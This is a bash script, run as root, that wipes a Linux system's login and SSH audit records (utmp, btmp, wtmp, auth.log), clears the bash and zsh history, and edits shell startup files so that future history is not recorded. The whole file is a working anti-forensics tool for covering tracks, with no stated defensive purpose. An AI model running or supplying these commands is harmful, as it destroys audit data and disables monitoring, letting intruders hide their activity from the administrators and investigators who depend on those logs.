#! /bin/bash

# 1. Check if script is running as root
if [ "$EUID" -ne 0 ]
  then echo "Please run the script as root"
  exit
fi

# 2. Clear ssh/login logs
# remove utmp / btmp / wtmp

rm /var/run/utmp
rm /var/run/btmp
rm /var/run/wtmp
rm /var/log/utmp
rm /var/log/btmp
rm /var/log/wtmp

# remove ssh logs
rm /var/log/auth.log*

# 3. Delete bash history
history -c
rm ~/.bash_history
echo 'history -c' >> ~/.bash_logout
rm ~/.zsh_history

# 4. Disable saving of history
echo 'unset HISTFILE' >> ~/.bashrc
echo 'export LESSHISTFILE="-"' >> ~/.bashrc